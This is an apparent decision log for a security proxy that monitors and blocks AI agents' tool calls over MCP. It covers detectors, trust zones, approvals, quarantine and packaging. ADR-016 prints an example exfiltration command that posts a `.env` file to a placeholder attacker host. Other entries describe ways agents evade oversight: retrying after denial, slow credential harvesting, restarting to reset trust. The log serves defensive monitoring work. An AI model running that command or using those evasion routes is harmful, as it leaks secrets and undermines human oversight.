# Decision Log (ADR)

Append-only. Each decision records what was chosen, what was rejected, and why —
so that in month four nobody re-litigates it from memory.

---

### ADR-001 — Intercept at the MCP protocol layer, framework adapters second
**Date:** 2026-09-19 · **Status:** accepted

MCP proxy is the primary interception point. A LangGraph callback adapter follows
in M4 as a second front door into the same engine.

*Rejected:* LangGraph-only interception. It covers one framework, and it misses
the most dangerous surface — filesystem, shell, database and secret access almost
always arrives over MCP.

*Consequence:* M1 carries real protocol risk (transport edge cases). Two spare
days are budgeted there.

---

### ADR-002 — SQLite now, Postgres-portable from day one
**Date:** 2026-09-19 · **Status:** accepted

Single SQLite file for development and small single-node installs. No Docker or
Postgres on the current dev machine, and a graph database would add operational
burden the client cannot carry.

*Rejected:* Neo4j. Path queries here are 2–4 hops; recursive CTEs handle that.
Two databases to deploy and back up is a bad trade for an SME.

*Consequence — binding constraints:*
- SQLAlchemy Core only, no SQLite-specific SQL
- ISO-8601 TEXT timestamps, JSON stored as TEXT
- `tenant_id TEXT NOT NULL DEFAULT 'default'` on every table, from the first migration
- Postgres switch is a config change in M5, not a rewrite

---

### ADR-003 — Self-hosted, single-tenant, in the client's VPC
**Date:** 2026-09-19 · **Status:** accepted

The client installs and runs it. No telemetry leaves their network.

*Rationale:* security buyers rarely agree to ship agent telemetry — which contains
source paths, queries and argument data — to a third party. Single-tenant also
removes ~3 weeks of isolation work from v1.

*Consequence:* cross-customer collective intelligence cannot ship in v1 by
construction. The schema supports it (ADR-002); the product does not use it.

---

### ADR-004 — Risk lives on the graph, never on an agents table
**Date:** 2026-09-19 · **Status:** accepted · **This is the load-bearing decision**

`risk` and `confidence` are columns on `nodes` and `edges`. There is no
`agents.risk_score`.

*Rationale:* this is the product's actual differentiation. Every vendor surveyed
scores the agent or the identity. Scoring the *resource* and the *edge* is what
makes "three agents independently flagged this MCP server" expressible at all.

*Consequence:* costs nothing now. Retrofitting it later is a rewrite — estimated
30 days. Therefore it goes in the first migration, in M0, before any detector exists.

---

### ADR-005 — `weaver_core` has zero I/O and zero framework dependencies
**Date:** 2026-09-19 · **Status:** accepted

The engine imports no FastAPI, no SQLAlchemy, no MCP library. Detectors are pure
functions taking `(event, window, graph_snapshot)`.

*Rationale:* two reasons, and the second is commercial. Testability, and — because
project ownership is still open (ADR-007) — a core that imports nothing is a core
that can be carved out, licensed or retained without untangling it from a product.

---

### ADR-006 — No LLM in the hot path
**Date:** 2026-09-19 · **Status:** accepted

Detection and classification are rules and statistics. No model call inside a
decision.

*Rationale:* a security layer that adds an LLM round-trip to every tool call is
unusable on latency alone, non-deterministic in its verdicts, unauditable, and —
given this product exists to police LLM agents — prompt-injectable through the
very arguments it inspects.

*Permitted use:* offline only. Polishing explanation sentences, and assisting
resource classification during baseline building. Never in a decision, never inline.

---

### ADR-007 — Ownership deliberately unresolved; structure keeps both paths open
**Date:** 2026-09-19 · **Status:** open — **must close before the M1 payment**

Repo is structured so the detection engine (`weaver_core`) is separable from the
product (`proxy`, `api`, `dashboard`).

*Why it matters:* if collective intelligence is the long-term moat, straight
work-for-hire hands that moat to the client for ₹12L. The recommended position is
a carve-out: client owns the product, deployment and all of their data; you retain
rights to the core detection engine, licensed to them perpetually and
royalty-free. Clients not in the security business usually agree — they want a
working product, not an engine to license onward.

*Deadline:* settle in writing before M1 money changes hands. Retrofitting an IP
split after delivery is a renegotiation, not an amendment.

---

## Open questions — answer these before M0 ends

| # | Question | Blocks | Why it matters |
|---|---|---|---|
| 1 | **Do we get access to the client's real agent traffic, and when?** | M2 tuning | Synthetic scenarios prove the engine works. Only their traffic reveals their false positives — and false positives are what get the product uninstalled. Ideally read-only observe-mode telemetry from week 4. |
| 2 | **Which MCP servers do they actually run?** | M1 integrations | The 3 bundled integrations should be theirs, not guesses. GitHub, Postgres and shell are the assumed default. |
| 3 | **Which agents, and how many, in production today?** | M2 baselines | Baselines need volume. Three agents doing 50 calls a day is a very different tuning problem from thirty doing 10,000. |
| 4 | **Product name.** | M1 (find-replace after that gets expensive) | `weaver` is a placeholder. |
| 5 | **Any compliance requirement in scope?** | M5 | DPDP Act, ISO 27001, a customer security questionnaire? If yes it changes the audit-log and retention design and it is not currently costed. |
| 6 | **Who operates it after handover?** | M5 docs + retainer | If nobody on their side owns detection tuning, the retainer is not optional — it is the thing that keeps the product working. |
| 7 | **Does the client expect to resell this, or use it internally?** | ADR-007 | Reselling makes the IP carve-out much harder to agree, and should change the price. |

---

### ADR-008 — Confidence is derived from the observation count, not accumulated
**Date:** 2026-09-20 · **Status:** accepted · supersedes the formula in ARCHITECTURE §5

```
confidence = n / (n + k)        k = 10
```

*Why the change:* the originally specified incremental form,
`c ← c + (1−c)/(n+1)`, saturates to 1.0 on the **first** observation. That
defeats the entire purpose of the confidence term — a node seen exactly once
would carry full weight into the decision score, which is the false positive
the term exists to prevent. Caught by the M0 test suite before any detector
consumed it.

*Consequence:* confidence is now stateless and recomputable from
`nodes.observations`, so it cannot drift from accumulation error. Pinned by
`test_single_observation_has_low_confidence`.

---

### ADR-009 — Distribution is self-install, not a VPC deployment
**Date:** 2026-09-20 · **Status:** accepted · **supersedes ADR-003**

The client is not deploying this internally. They will publish it — source on
GitHub under their account, package on a public registry — and users install it
into their own CLI or environment and point their agents at it.

*What this changes:*

| | ADR-003 (superseded) | ADR-009 (now) |
|---|---|---|
| Install | Client's ops team, in their VPC | `pip install` / `npx`, any developer |
| Tenancy | Single-tenant per install | One user, one machine — tenancy is moot |
| Auth | User accounts, roles | Localhost, no accounts in v1 |
| Dashboard | Hosted in their network | Local web UI on 127.0.0.1 |
| The bar | "Can their ops team run it?" | "Does it work in 5 minutes for a stranger?" |

*Consequence — M5 is re-scoped, not shortened.* Roughly a week of auth, roles
and tenancy work comes out. Roughly the same goes back in, on things that
barely mattered before: one-command install, sensible defaults with zero
config, a genuinely good README, clear error messages, `--help` that explains
itself, and an uninstall that leaves nothing behind. A self-install tool is
judged in its first five minutes by someone with no context and no patience.

*`tenant_id` stays in the schema.* It costs nothing, and a hosted version later
is now a plausible direction rather than an excluded one.

---

### ADR-010 — No real agent traffic exists; validation is synthetic until a test agent exists
**Date:** 2026-09-20 · **Status:** accepted · **carries the project's largest risk**

There is no production agent traffic to learn from. The plan is to build the
security layer first, then build a separate agent project to test it against.

*The honest consequence:* the M2 exit criterion "≤ 5% false positives" cannot
be claimed against real traffic, because there is none. What can be claimed is
"≤ 5% against the scenario suite" — and a suite we wrote ourselves cannot
surprise us. Detection quality is unproven until real agents run through it.

*Mitigations, in order of value:*

1. **The benign suite is the product's real specification.** It is now 10
   scenarios against 6 attacks — deliberately weighted toward false positives,
   because a missed detection is a bug while a false positive is an uninstall.
   Every benign case encodes a way the detector could be wrong.
2. **Dogfood early.** Point the proxy at this repo's own Claude Code / Cursor
   sessions from M1 onward. That is real agent traffic, available immediately,
   and it costs nothing.
3. **Build the test-agent project in parallel with M3**, not after M5. It needs
   to produce traffic while detectors are still cheap to change.
4. **Restate the contract exit criteria** in terms of the scenario suite plus
   dogfood traffic. Do not promise a false-positive rate on traffic nobody has
   seen.

*Open:* which MCP servers the client runs is still unknown. Building against
GitHub, Postgres and shell as the assumed default (ADR-001).

---

### ADR-011 — `argument_anomaly` by structure, not embeddings
**Date:** 2026-09-20 · **Status:** accepted · replaces `argument_drift`

The original Tier-2 design measured embedding distance between a call's
arguments and the agent's centroid for that tool. Replaced with structural
statistics: payload byte-size z-score, and novelty of the parameter key-set.

*Why:*

- An embedding model in the decision path costs inference latency on every
  tool call, in a product whose budget is 50ms total.
- It makes verdicts non-deterministic and therefore unauditable — "why was this
  blocked" has no stable answer.
- The product exists to police LLM agents. Feeding attacker-controlled tool
  arguments into a model, inside the component deciding whether to block them,
  is prompt injection with extra steps.
- It adds a heavyweight dependency to a tool people are meant to `pip install`
  (ADR-009).

*What it costs:* semantic drift is invisible. An argument that is the same size
and shape but semantically strange reads as normal.

*What it buys:* bulk exfiltration is caught by size alone — the dominant real
signal — with no model, no latency, and no need to store the arguments
themselves. Only shape (key names and byte count) is retained, never values.

---

### ADR-012 — Tier 2 runs inline, in the same pass as Tier 1
**Date:** 2026-09-20 · **Status:** accepted · amends ARCHITECTURE §4

Consequence of ADR-011. With embeddings gone, every Tier-2 detector is an O(1)
check over accumulators already in memory, so the async control-plane split
buys nothing and costs a one-event lag in the evidence available to a decision.

Separate registries are kept (`run_tier1`, `run_tier2`, `run_all`) so the
distinction stays visible and a detector cannot silently land in the wrong
tier — `test_tiers_do_not_overlap` fails if one registers in both. The tier
distinction survives where it always mattered: **weight**. No Tier-2 detector
short-circuits to BLOCK.

---

### ADR-013 — The database lives in `~/.weaver`, never in the user's project
**Date:** 2026-09-20 · **Status:** accepted

Default `WEAVER_DB_URL` is `sqlite:///~/.weaver/weaver.db`, overridable with
`WEAVER_HOME`.

*Why:* a tool people install should not drop a database into the directory they
are working in. It pollutes the repo, it gets committed by accident, and — as
this project hit directly, running from an external drive — SQLite's locking
can fail outright on removable or network volumes with "attempt to write a
readonly database".

*Also fixed here,* two SQLite behaviours that fail confusingly:

- Every connection to `:memory:` gets its own empty database, so tables created
  during setup are invisible to the next connection. `StaticPool` pins the
  engine to one connection.
- The API serves requests on a thread pool, and SQLite refuses cross-thread use
  by default. `check_same_thread=False` is required; SQLAlchemy's pool already
  serialises access, so it is safe.

Neither applies to Postgres, which is one more reason the M5 switch simplifies
this rather than complicating it.

---

### ADR-014 — Setup creates a virtualenv; `--break-system-packages` is never used
**Date:** 2026-09-20 · **Status:** accepted

`scripts/dev-setup.sh` creates `.venv` and installs there. If a venv or conda
env is already active it uses that instead. `--here` forces the active
interpreter.

*Why:* Homebrew, Debian and Fedora Pythons are marked externally managed under
PEP 668 and refuse `pip install`. The documented override,
`--break-system-packages`, can corrupt a Homebrew installation — not a
reasonable thing for a setup script to do to somebody's machine.

*Why it matters beyond this repo:* ADR-009 makes install the single most
important thing about this product. Every macOS and Linux user who installs it
will hit PEP 668. Discovering that on a real machine on day one, rather than in
M5 on a stranger's, is worth more than the hour it cost.

*Two related bugs fixed alongside:*

- `pyyaml` was used by the scenario loader but declared nowhere, so a clean
  install crashed on `--demo`. It is now the `weaver-core[scenarios]` extra —
  the engine keeps its zero-dependency promise (ADR-005) and the component that
  actually needs a YAML parser asks for one.
- `httpx` is required by starlette's `TestClient` and was similarly
  undeclared, so `pytest` failed at collection on a clean install.

Both were invisible until the setup was run against an empty environment. Any
change to dependencies should be verified the same way:
`rm -rf .venv && bash scripts/dev-setup.sh && .venv/bin/python -m pytest`.

---

### ADR-015 — The shipper uses stdlib `urllib`, and drops rather than retrying forever
**Date:** 2026-09-20 · **Status:** accepted

The proxy ships batches to the control plane with `urllib` on a thread
executor, not httpx.

*Why no dependency:* the proxy is what users install and run in front of their
agents. Every dependency it carries is one more thing that can fail at install
time (ADR-009, ADR-014). POSTing JSON to a local API does not justify one.

*Why it drops:* a control plane that never comes back must not turn into
unbounded memory inside the security layer. Batches are retried three times
with exponential backoff, then dropped and counted. Losing telemetry is the
correct failure; an OOM in the component sitting in front of someone's agent is
not.

Nothing in the shipper runs on the request path — `emit()` stays synchronous
and non-blocking, pinned by `test_shipping_never_blocks_emit`.

---

### ADR-016 — Shell commands are classified by what they do, not what they mention
**Date:** 2026-09-20 · **Status:** accepted · **found by running real traffic**

`shell://` URIs are classified in order of blast radius:

1. reaches an external network host → `NETWORK_EGRESS`
2. references something secret-shaped → `SECRET`
3. otherwise → `SHELL`

*How this was found.* The first end-to-end run of the full loop — proxy,
shipper, API, dashboard — put `curl -X POST https://drop.evil.net -d @/app/.env`
through the proxy. It was allowed, with a score of 0.00. The classifier matched
`.env` first, called it `SECRET`, and never noticed the outbound `curl`.
`sensitive_then_egress` needs an egress action, so nothing fired. The single
most obvious exfiltration command in existence walked straight through.

Nothing in the scenario suite caught this, because the suite was written by
reasoning about attacks rather than by watching traffic. Sixteen scenarios, a
hundred and forty tests, and the canonical one-liner was invisible.

*Also added:* `shell_exfil` (Tier 1, CRITICAL, short-circuits) — one command
that both reaches the network and references a secret. `sensitive_then_egress`
is a two-step detector and cannot see a one-step attack.

Both halves are required, or `pip install` and every health check would fire.
`scenarios/benign/shell_network_no_secret.yaml` pins that.

*Related correction:* `/etc/passwd` was briefly classified as `SECRET`. It is
world-readable and contains no passwords — a recon signal, not a secret.
Over-classifying it inflates its risk floor to 0.30 and buys noise.
`/etc/shadow` stays.

---

### ADR-017 — An unanswered approval denies
**Date:** 2026-09-20 · **Status:** accepted

An ASK verdict suspends the agent's tool call and opens an approval request.
If nobody answers within `askTimeoutSeconds` (default 120), the call is
**denied**.

*Why deny:* the alternative lets an agent obtain any ASK-worthy action by
waiting. An unattended overnight run would simply outlast every request, and
ASK would quietly degrade into a logging tier that announces attacks instead of
stopping them.

*What it costs:* an unattended agent that trips an ASK rule stalls for two
minutes and then fails. That is a real cost, and it is the reason ASK rules
should be rare and specific. The failure is clean — a structured MCP error
naming the rule and the timeout — so the agent can tell its operator why rather
than failing opaquely.

*Corollary:* enforce mode **refuses to start** without a control plane. Without
somewhere to send approvals there is nobody to ask, and the only options are
"allow everything ASK-worthy" or "block everything ASK-worthy" — both bad
enough to refuse at startup rather than discover in production.

---

### ADR-018 — Allow rules can never override a CRITICAL detector
**Date:** 2026-09-20 · **Status:** accepted

Policy rules layer over the behavioural verdict, asymmetrically:

* `block` and `ask` rules only RAISE a verdict
* `allow` rules only LOWER one, and never past a CRITICAL detector

*Why:* an allowlist that can silence `retry_after_denial`, `sensitive_then_egress`
or `shell_exfil` is a backdoor with a config file in front of it. The realistic
path to it is mundane — somebody tired of noise writes `always allow shell-mcp`,
and switches off the product's whole reason for existing without knowing.

A rule with an empty `match` block never fires either, so a typo cannot become
a fleet-wide block.

---

### ADR-019 — An approval carries its own context
**Date:** 2026-09-20 · **Status:** accepted

The `approvals` row denormalises agent, tool, resource and class rather than
joining to `events`.

*Why:* the proxy opens an approval the instant it decides, while the event
ships on the shipper's next batch — up to two seconds later. Joining left the
approver looking at `None | | ` for exactly the window that matters. Someone
asked to approve something they cannot see will either rubber-stamp everything
or deny everything, and both destroy the feature.

Found by running the flow live rather than by testing the endpoints
individually, which had all passed.

---

### ADR-020 — `retry_after_denial` could never fire; MCP has no "denied"
**Date:** 2026-09-20 · **Status:** accepted · **the most serious bug found so far**

Nothing in the proxy ever set `Status.DENIED`. The detector called "the
signature detector" throughout this project — the one designed to be built
first and demoed first — was dead code in production for all of M1 through M3.

It passed every test, because the scenario YAML sets `status: denied` by hand.
A hundred and seventy tests, a scenario suite reporting 100% detection, and the
product's headline capability had never once run on real traffic.

*Root cause:* MCP has no distinct denial status. A permission refusal and a
missing file both come back as an error, so the proxy recorded both as `ERROR`,
and `last_denial()` — which correctly refuses to treat an error as a refusal —
found nothing to match.

*Fix, two parts:*

1. `looks_denied()` classifies upstream error text: "permission denied",
   "forbidden", "EACCES", "unauthorized" and similar are refusals; "no such
   file", "ENOENT", "not found" are absences. The distinction matters, because
   agents probe for optional files constantly and treating absence as refusal
   would make every dependency check look like evasion.
2. Our **own** BLOCK now counts as a denial. An agent we just blocked, which
   immediately probes a different route to the same target, is the clearest
   evasion signal there is — and it was the case this specifically ignored.

*How it was found:* the red-team suite, driving the real proxy over real MCP
subprocesses. Nothing in the unit tests or the scenario suite could have found
it, because both supply the status the detector is looking for.

---

### ADR-021 — Novelty is context, not evidence
**Date:** 2026-09-20 · **Status:** accepted · supersedes the graduated weighting in ADR-011's era

`novel_sequence` is LOW, always. Additionally, a decision composed **only** of
LOW signals stays ALLOW, however many of them there are.

*Why:* the first red-team run against real MCP servers fired `novel_sequence`
on `pip install`, on an application reading its own `.env` at boot, and on
internal health checks — **three false positives out of four benign cases**.
The scenario suite had reported zero for weeks, because a suite we wrote only
contains sequences we thought of, and real tooling produces thousands we did
not.

*What it costs:* `slow_harvest` — credential reads interleaved with ordinary
work — is no longer caught. It was only ever caught incidentally by
`novel_sequence` anyway, and it is genuinely a job for Tier-3 `path_risk` in
M4, since no individual window in it is anomalous.

*Why that trade is right:* a tool that asks a human to approve `pip install` is
uninstalled within a day, and a tool that has been uninstalled catches nothing
at all. A missed detection is a bug; a false positive is an exit.

*The general rule this encodes:* LOW means "unusual", not "wrong". Unusual is
worth recording, and worth amplifying something else. It is never worth
interrupting a person over on its own.

---

### ADR-022 — Trust zones gate sensitive classes; they do not shade thresholds
**Date:** 2026-09-25 · **Status:** accepted

A WARM agent needs approval for `secret`, `shell`, `database` and
`network_egress` actions. A HOT agent is blocked from them. Ordinary work —
source code, config, reads and writes — is untouched at every trust level.

*Rejected:* lowering the ASK and BLOCK thresholds as trust falls, so every
detector becomes more sensitive at once.

*Why:* that is the `novel_sequence` failure with extra steps. One bad trust
score would turn into false positives across the agent's entire workload, and
the blast radius of a scoring mistake would be everything the agent does rather
than the handful of actions that actually matter. It also makes "why was this
blocked" unanswerable — the verdict depends on a number that moved for reasons
several actions ago.

*Consequence:* gating is coarse. An agent at 0.69 trust and one at 0.31 are
treated identically, and a sensitive action is either gated or not. Predictable
beats expressive here.

*Also:* gating only ever RAISES a verdict. A trust score can make an agent less
free; it can never make a flagged action allowed.

---

### ADR-023 — Trust persists through the control plane
**Date:** 2026-09-25 · **Status:** accepted

Trust, zone, hot-signal count and quarantine live in the `agents` table. The
proxy loads them before serving its first request and pushes changes back every
15 seconds and on shutdown.

*Why:* in-memory trust makes restarting the proxy an escape hatch, and
restarting is the first thing anyone does when a tool starts blocking them. An
agent that earned its way to HOT must not get a clean slate for free.

*Quarantine is cleared only by a human* — `POST /v1/agents/{id}/release`. Trust
recovers with time; quarantine does not, because the thing that caused it was
repeated signals after the agent had already lost most of its trust.

*Consequence:* the proxy degrades without a control plane rather than failing.
It starts with default trust, everything still works, and the sync loop picks
up when the API returns.

---

### ADR-024 — The proxy refreshes its graph snapshot from the control plane
**Date:** 2026-09-25 · **Status:** accepted · **a gap in the original design**

`ControlPlaneSync` pulls `/v1/graph` every 30 seconds and replaces the proxy's
in-memory snapshot.

*Why it was missing:* ARCHITECTURE §1 rule 1 says the data plane never queries
the database to decide — it reads an in-memory snapshot "which the control
plane refreshes on a timer". That timer was described and never built. Node
risk in the proxy therefore stayed at its class floor forever, and
`resource_reputation` could not fire regardless of what any other agent had
done. **The product's central differentiator had no path into the hot path.**

Nothing caught it because every test and both suites run the engine in-process,
where the snapshot is the same object the engine writes to. Only a real proxy
talking to a real control plane has two copies.

*Replaced, not merged.* The control plane is authoritative and has already
applied decay on read; merging would let a stale local risk value outlive the
real one.

*Consequence:* resource reputation lags by up to 30 seconds. Acceptable — risk
decays over hours, and the alternative is a database read on the request path.

---

### ADR-025 — The LangGraph adapter is advisory, not enforcing
**Date:** 2026-09-25 · **Status:** accepted

`WeaverCallbackHandler` records and scores in-process tool calls. By default a
BLOCK is recorded and the call proceeds. `raise_on_block=True` raises
`ToolBlocked` instead.

*Why advisory:* a LangChain callback cannot veto a tool call. By the time
`on_tool_start` runs the framework is committed, and raising may leave the graph
in a state the author did not plan for — after side effects have already
happened. Claiming enforcement here would be claiming something the framework
does not offer.

*Honest framing for the docs and for the client:* the adapter is for
**visibility** into calls that never cross MCP. The proxy is where blocking
actually works. A deployment that needs enforcement routes its dangerous tools
through MCP.

*The adapter imports nothing from langchain*, so `weaver_langgraph` installs
and tests without it, and emits the identical event shape into the identical
engine — including the refusal-vs-absence classification from ADR-020, so
`retry_after_denial` works through this door too.

---

### ADR-026 — Migrations are a hand-rolled versioned runner, not Alembic
**Date:** 2026-09-25 · **Status:** accepted

`weaver_store/migrate.py`: a numbered list of Python steps and one
`schema_version` table. `init_db()` runs it instead of `create_all()`.

*The bug it exists for:* `metadata.create_all()` creates missing TABLES and
silently ignores missing COLUMNS. M4 added `agents.hot_signals` and
`agents.quarantined`; any database created before that would never have gained
them. The proxy would start, fail to persist quarantine state, and say nothing —
an agent could escape a quarantine by restarting, and no error would appear
anywhere.

*Rejected:* Alembic. It is the standard and a client's engineer would expect
it, but it is a real dependency with its own config in a product whose install
story is the thing it gets judged on (ADR-009), and its autogenerate is
unreliable across two backends when the whole point of ADR-002 is portability.

*The rules, which matter more than the runner:*

- append, never edit — a shipped migration has already run on someone's machine
- every step must be safe to re-run (`test_every_migration_is_safe_to_rerun`)
- SQL must work on SQLite and Postgres, or branch on the dialect

`weaver migrate --check` exits non-zero when migrations are pending, so it works
as a deploy gate, and `/readyz` returns 503 on a stale schema.

---

### ADR-027 — One package, one command
**Date:** 2026-09-25 · **Status:** accepted, **name superseded by ADR-030**

One `pip install` installs everything and provides a single `weaver`
command (the *distribution* name is unresolved — ADR-030): `api`, `proxy`, `doctor`, `migrate`, `version`.

*Why:* a stranger who has just installed this has one thing to discover, and
`weaver --help` tells them the rest. Four separately-installed packages and two
executables is a worse first five minutes, and ADR-009 makes those five minutes
the thing the product is judged on.

*What is preserved:* the internal split under `packages/` is unchanged.
`weaver_core` still imports nothing (ADR-005) and is still separable for the
ownership carve-out (ADR-007) — users simply never see the seam. The wheel is
assembled from the six internal packages by one hatchling target.

**Unverified here.** pip cannot write into this sandbox's virtualenv, so the
wheel has never actually been built. The configuration is statically validated
(every listed package exists and has an `__init__.py`), and
`scripts/ops/release-check.sh` builds the wheel, checks its contents, installs
it into a throwaway virtualenv and runs the CLI from there. **Run that before
believing this ADR.**

---

### ADR-028 — Postgres is supported but untested
**Date:** 2026-09-25 · **Status:** accepted · **honest limitation**

`get_engine` handles `postgresql://` with pool settings appropriate to a
threaded API plus the proxy's sync loop, behind the `weaver[postgres]` extra.

*Why an extra:* the driver is a build dependency on many systems, and nearly
everyone uses the SQLite path. Requiring it would tax every install for a
feature most users never touch. A missing driver raises an error naming the
exact fix.

*Untested, and stated as such.* There is no Postgres or Docker in this
environment. `test_postgres_without_the_driver_says_what_to_install` covers the
error path and nothing covers the real one. `docker-compose.yml` has a
`postgres` profile that should work and has never run.

Do not tell a client Postgres is supported until someone has run
`weaver migrate` and the test suite against a real server. Writing the switch
is the easy half; the half that finds bugs is the half not done.

---

### ADR-029 — The proxy is not containerised
**Date:** 2026-09-25 · **Status:** accepted

The Dockerfile builds the **control plane** only. The proxy is expected to run
on the host.

*Why:* the proxy runs as a subprocess of the user's MCP client and spawns the
upstream MCP servers as its own children, over stdio. In a container it is cut
off from both — the client cannot start it, and it cannot reach the filesystem
or shell the upstream servers operate on. A containerised proxy would be a
proxy with nothing to proxy.

*Consequence:* deployment is asymmetric and the docs must say so plainly.
`docker compose up` gives you the dashboard; the proxy is installed with
installed from the repo on whatever machine the agent runs on. That is also the
honest shape of the product — the data plane belongs next to the agent.

---

### ADR-030 — The name `weaver` is taken on PyPI; a distribution name is now blocking
**Date:** 2026-09-26 · **Status:** open — **blocks publishing**

`weaver` is an existing package on PyPI (version 0.1), and `weaver-core` is
someone else's at 0.4.17 — which is also one of our internal package names.
`pip install weaver` therefore installs a stranger's code, not this project.

*How it was found:* `docs/OPERATIONS.md` and `PRIMER.md`, written in M5, told
the reader to run `pip install weaver`. Somebody did. pip resolved it against
PyPI, reported "Requirement already satisfied: weaver ... (0.1)" — note the
version, which is not ours — and there was no `weaver` command afterwards
because that package does not provide one.

*Two distinct failures, worth separating:*

1. **A documentation error.** M5 built the packaging and then documented it as
   if it were published. Nothing had been published, and the install command
   was fiction presented as fact. Docs must never describe a step that has not
   been performed — every other command in `COMMANDS.md` was run before being
   written down, and this one was not.
2. **A name collision**, which the error surfaced early and cheaply. Finding it
   from a stray `pip install` costs nothing; finding it on publish day costs a
   rename across the repo, the docs and anything already shared.

*Consequences:*

- No `pip install <name>` appears in any document until a distribution name is
  chosen, checked against PyPI, and published. Corrected in OPERATIONS,
  PRIMER, COMMANDS and CLAUDE.md.
- Open question #4 (the product name) moves from deferred to **blocking**.
- The distribution name and the import names can differ — `weaver_core` as an
  import is fine even if `weaver-core` is taken as a distribution. Only what
  goes in `[project] name` and `[project.scripts]` has to be unique.
- Check the CLI name too: a `weaver` binary on PATH could collide with
  something a user already has.

*Not yet decided,* so the codename stays `weaver` throughout the code until a
replacement is chosen. One find-replace changes it.

---

### ADR-031 — Uninstalling the colliding package leaves a directory that shadows ours
**Date:** 2026-09-26 · **Status:** accepted · follows ADR-030

`pip uninstall weaver` removes the third-party package's metadata but can leave
`site-packages/weaver/` on disk. A real directory in `site-packages` takes
precedence over an editable install's path entry, so `import weaver` keeps
resolving to the stranger's code — and fails on *its* imports:

```
File ".../site-packages/weaver/__init__.py", line 3
    from fabric.api import *
ModuleNotFoundError: No module named 'fabric.api'
```

Nothing in that traceback mentions this project. The natural reading is "a
dependency is missing", and `pip install fabric` does not help — `fabric.api`
was Fabric 1.x and no longer exists in Fabric 3.

*Two guards added:*

1. **`weaver doctor`** now reports where each package resolved from, warns when
   it is outside the repo, distinguishes *missing* from *installed but broken*,
   and prints the `rm -rf` that fixes it.
2. **`dev-setup.sh`** checks for a shadowing `weaver` directory **before**
   installing and refuses with the fix, rather than installing successfully and
   failing at verification.

Both pinned by `test_doctor_detects_a_shadowing_package`, which builds the real
failure — a `site-packages/weaver/__init__.py` containing `from fabric.api
import *`.

*The broader point.* ADR-030 said the name collision blocks publishing. This is
a second, sharper cost: the collision damages a developer's environment in a way
that is actively misleading to debug. The rename is not cosmetic and should not
wait for a release.

---

### ADR-032 — Client configs name an interpreter, never a console script
**Date:** 2026-09-27 · **Status:** accepted · follows ADR-014, ADR-031

`docs/TEST-URIS.md` and the generated `uris/.vscode/mcp.json` pointed Copilot at
`/Volumes/Seagate/AI_Layer/.venv/bin/weaver`. Both were wrong, for two reasons
at once:

1. **That venv belongs to another machine.** `AI_Layer` lives on an external
   drive shared with a Linux VM, and `.venv` was created there — `pyvenv.cfg`
   says `home = /usr/bin`, `version = 3.10.12`, and `bin/python3` symlinks to
   `/usr/bin/python3`. Its binaries cannot execute on macOS.
2. **There is no `weaver` in it anyway.** On the Mac, `dev-setup.sh` found a
   virtualenv already active and installed into that one instead — correctly,
   and it said so — so the console script was written to a completely different
   prefix.

An MCP client launches its server with none of the shell's environment: no
PATH, no activated venv. So the config has to carry an absolute path, and an
absolute path to a per-environment console script is the most fragile thing it
could carry. When it is wrong the client reports *"server exited"* and nothing
else — no traceback, no mention of a path.

*Decision.* Client configs name the **interpreter** and use `-m`:

```json
"command": "/abs/path/to/env/bin/python3",
"args": ["-m", "weaver", "proxy", "--config", "...", "--detect", "--api", "..."]
```

One path instead of two, and no console-script shim that may never have been
written. Docs stop printing a `.venv/...` path for the reader to copy; they
print the command that produces the reader's own.

*The guard:* `scripts/ops/check-client-config.py`. Given a client config it
resolves each weaver entry's command, checks it exists and is executable,
compares the binary format against the host (an ELF file on macOS is now a named
failure, not a mystery), follows a `#!` line to its interpreter, warns when the
config's prefix differs from the one running the check, then **runs
`weaver version` through it** — inference above, ground truth here. It also
parses the `--config` file and opens a socket to `--api`, because a config that
launches but ships nowhere leaves an empty dashboard. `--fix` rewrites every
weaver entry to `sys.executable -m weaver`, which is correct by construction:
the interpreter running the checker is the one that can import weaver. It
imports nothing from weaver, like `scripts/doctor.py` and for the same reason.

*Why this belongs in the record.* This is the fourth interpreter-identity bug in
this project (ADR-014 PEP 668, ADR-030 name collision, ADR-031 shadowing, now
this) and the second one the test suite could never have caught — `pytest` uses
`pythonpath` and never launches the installed console script, exactly as the CLI
package's absence went unnoticed in ADR-026's neighbourhood. The pattern is
consistent enough to state plainly: **anything that only breaks across a process
boundary the tests do not cross needs an executable check, not a test.** Three
now exist — `weaver doctor`, `scripts/doctor.py`, and this.

---

### ADR-033 — The product is named Guardent; the code rename is a separate step
**Date:** 2026-09-27 · **Status:** accepted · resolves the open question in ADR-030

ADR-030 recorded that `weaver` is taken on PyPI by an unrelated package, which
blocks publication, and ADR-031 recorded that the collision actively damages a
developer's environment. The name was the last thing standing between this and
a release, and it was left unresolved.

*Decision.* The product is **Guardent**. `guardent` is free on PyPI and on npm,
checked 2026-09-27.

*What this decision does NOT do.* The code is untouched. `weaver`,
`weaver_core`, `weaver_store`, `weaver_proxy`, `weaver_api`, `~/.weaver/` and
the `"weaver"` key in the config file all stay as they are for now.

The rename is mechanical — one find-replace across the packages — but it is not
free. It invalidates every MCP client config that names `-m weaver`, every
virtualenv holding an editable install, and every `~/.weaver/weaver.db` path.
Doing it in the middle of the first real dogfood run against `uris` would have
thrown away the only real traffic this project has ever seen (ADR-010), to fix
something that blocks nothing until publication.

*So the rename is sequenced after the dogfood run,* and `docs/GUARDENT.md`
states the split plainly so a new reader is not confused by it: Guardent is the
product, `weaver` is the command.

*When it happens, it must cover:* the five package directories and their
distribution names; the console script; `WEAVER_HOME` and `~/.weaver`; the
`weaver` key in `weaver.config.json`; the stderr banner lines the docs tell
readers to look for; and a migration or documented manual step for the existing
database path. `scripts/ops/check-client-config.py --fix` already rewrites
client configs, so that part is covered.

---

### ADR-034 — Renamed to Hypothesise; distributed as a CLI tool
**Date:** 2026-10-07 · **Status:** accepted · supersedes the *name* in ADR-033

*Decision.* The product and the code are both **Hypothesise**. The distribution,
the console script and every package are renamed: `hypothesise`,
`hypothesise_core`, `hypothesise_store`, `hypothesise_proxy`, `hypothesise_api`,
`hypothesise_langgraph`. `hypothesise` was free on PyPI on 2026-10-07.

ADR-033's checklist, item by item:

| Item | Done |
|---|---|
| package directories and distribution names | renamed |
| console script | `hypothesise` |
| `WEAVER_*` env vars, `~/.weaver` | now `HYPOTHESISE_*`, `~/.hypothesise` — old names are **not** read |
| `"weaver"` key in the config file | renamed; the old key is still accepted |
| database path | manual: `mv ~/.weaver ~/.hypothesise && mv ~/.hypothesise/weaver.db ~/.hypothesise/hypothesise.db` |
| client configs naming `-m weaver` | `init` refuses to wrap them; remove the entry and re-run `hypothesise init` |

